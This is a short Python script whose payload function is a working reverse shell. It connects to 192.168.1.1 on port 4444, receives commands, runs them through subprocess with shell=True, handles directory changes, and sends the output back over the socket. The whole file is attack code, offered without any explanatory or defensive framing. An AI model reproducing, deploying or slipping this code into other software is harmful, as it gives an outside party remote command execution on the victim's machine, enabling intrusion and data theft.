import socket
import subprocess
import os
from colored import fg


def payload():
    try:
        c = socket.socket()
        c.connect(('192.168.1.1', 4444))
        print(c.recv(1024).decode())

        def use():
            while True:
                try:
                    global run
                    global answer
                    global cmd
                    cmd = c.recv(20480).decode()
                    if cmd[:2] == "cd" and len(cmd) > 2:
                        os.chdir(cmd[3:])
                        new = os.getcwd()
                        c.send(bytes(str(new), "UTF-8"))
                    run = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    answer = run.stdout
                    if len(answer) == 0:
                        c.send(bytes(" ", "UTF-8"))
                    elif len(answer) > 0:
                        c.send(bytes(answer, "UTF-8"))

                except:
                    print("Command can't be exicuted")
                    c.close()
                    break

        use()
    except:
        print("Your address is not valid in its context")
